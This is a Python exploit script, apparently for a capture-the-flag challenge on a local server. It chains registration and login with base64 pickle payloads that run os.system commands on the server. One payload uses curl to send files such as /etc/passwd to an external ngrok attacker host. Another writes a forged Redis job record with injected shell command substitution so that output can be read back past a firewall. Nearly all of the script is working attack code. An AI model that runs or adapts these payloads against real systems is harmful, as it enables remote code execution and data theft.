#!/usr/bin/env python3
'''
[+] Exploit for the Yugen's Guide
[*] Not a solution, but rather it is meant to guide the user on what vulnerabilties exist.
[+] Some vulnerabilities are not exploitable through this script and hence should be guided by logic.
'''

### Imports
import requests, base64, random, string, textwrap, json, shlex
from datetime import datetime, timezone


### VARIABLES
HOST = "http://127.0.0.1:1337/challenge"
ATTACKER_HOST = "https://ff9cc64cde32.ngrok-free.app"
SESSION = requests.Session()
HEXGEN = string.digits + string.ascii_lowercase[:5]

CREDENTIALS = {
    "username": "".join(random.choices(string.ascii_letters + string.digits, k=32)),
    "password": "".join(random.choices(string.ascii_letters + string.digits, k=32)),
}



# First step is register
def register():
    response = SESSION.post(f"{HOST}/register", data=CREDENTIALS)
    if (response.status_code != 200 and b'Registered.Please login' not in response.content):
        return False
    
    return True


def login():
    response = SESSION.post(f"{HOST}/login", data=CREDENTIALS)
    if (response.status_code != 200 and '/challenge/' not in response.url):
        return False
    
    return True


# Exploit payload - executes arbitrary command via os.system]
def create_exploit(command: str = "echo 1", file: str = "/etc/passwd", option: int = 1):
    # Command execution and reading files
    if option == 1:
        final_payload = f"(S'{command}'\nios\nsystem\n.".encode()
    else:
        final_payload = f"(S'curl -m 5 -d @{file} {ATTACKER_HOST} > /dev/null 2>&1'\nios\nsystem\n.".encode()

    return base64.b64encode(final_payload).decode()


## READ FILES
def file_read(filename : str = "/etc/passwd"):
    data = {
        "id" : "".join(random.choices(HEXGEN, k=32)),
        "data" : create_exploit(option=2, file=filename)
    }

    response = SESSION.post(f"{HOST}/backend", json=data)
    if (response.status_code != 202):
        print(response.json())
        return False

    data = response.json()
    return data["id"]


def command_injection(command : str = "echo 1 > /tmp/pwned.txt"):
    data = {
        "id" : "".join(random.choices(HEXGEN, k=32)),
        "data" : create_exploit(option=1, command=command)
    }

    response = SESSION.post(f"{HOST}/backend", json=data)
    if (response.status_code != 202):
        print(response.json())
        return False

    data = response.json()
    return data["id"]


# To manipulate the state to get output even in internal firewalled networks
def state_based_attack():
    # In case the network is firewalled then it becomes prudent to extract data in redis manner
    time_done =  datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f+00:00")
    job_id = ''.join(random.choices(HEXGEN, k=32))

    # 2 stage payload
    JSON_DATA = {
        "id" : job_id,
        "name" : "$(head -n 1 /etc/passwd)",
        "time_done" : time_done,
        "stdout" : "Hey there",
        "note" : "standard print",
        "uploaded_path" : "/app/doesnotexist",
        "submitted_at" : time_done,
        "status" : "FINISHED",
        "submitted_by" : "APTGang"
    }

    JSON_STRING = json.dumps(JSON_DATA).replace('"', '\\"')
    redis_command = f'redis-cli -s /tmp/redis.sock SET "job:{job_id}:result" "{JSON_STRING}"'

    redis_encode = base64.b64encode(redis_command.encode()).decode()
    final_command = f"echo {redis_encode} | base64 -d | sh"
    # print(final_command)

    FIRST_JOB = command_injection(final_command)

    if not FIRST_JOB:
        return False

    return job_id, FIRST_JOB
    


## EXPLOIT
print("[+] Running exploit ... ")
REGISTER_STATUS = register()
if not REGISTER_STATUS:
    print("[-] Failed to register")
    exit(1)

print(f"[+] Register completed successfully => {CREDENTIALS}")

LOGIN_STATUS = login()
if not LOGIN_STATUS:
    print("[-] Failed to login")
    exit(1)

print("[+] Login completed successfully")

FILE_READ_STATUS = file_read("/etc/hosts")
if not FILE_READ_STATUS:
    print("[-] Failed to read file")
    exit(1)
print(f"[+] File read: {FILE_READ_STATUS}")

COMMAND_INJECTION_STATUS = command_injection()
if not COMMAND_INJECTION_STATUS:
    print("[-] Failed to inject command")
    exit(1)
print(f"[+] Command injection: {COMMAND_INJECTION_STATUS}")

STATE_STATUS, FIRST_JOB = state_based_attack()
if not STATE_STATUS:
    print("[-] State Based Attack has failed!")
    exit(1)

print(f"[+] State Based Attack: {STATE_STATUS} ID TO CHECK => {FIRST_JOB} RESPONSIBLE FOR OUR STATE ABUSE")
print(f"Waiting for 2 mins and using it to fetch the job ... ")

print(f"Use: {HOST}/jobs/{STATE_STATUS}/summary to see output (after 2 mins)!")

print("[+] Exploit completed successfully")
